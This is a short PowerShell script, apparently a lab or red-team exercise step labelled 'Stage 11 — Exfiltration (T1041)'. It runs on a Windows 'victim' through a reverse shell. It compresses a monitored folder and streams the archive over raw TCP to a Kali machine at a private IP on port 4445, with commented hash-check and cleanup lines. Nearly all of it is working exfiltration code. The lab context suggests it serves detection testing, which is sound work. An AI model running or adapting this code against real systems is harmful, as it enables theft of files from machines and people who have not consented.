# Stage 11 — Exfiltration (T1041), part 2/2
# Host: Windows 11 victim, run through the reverse shell
# Compresses the FIM-monitored folder and sends it to Kali over TCP/4445.

Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force

$client = New-Object System.Net.Sockets.TCPClient("192.168.60.135", 4445)
$stream = $client.GetStream()
$bytes  = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\exfil_test.zip")
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()

# Verify integrity against the Kali side after the transfer:
# Get-FileHash C:\Windows\Temp\exfil_test.zip -Algorithm SHA256

# Cleanup after the test:
# Remove-Item C:\Windows\Temp\exfil_test.zip -Force
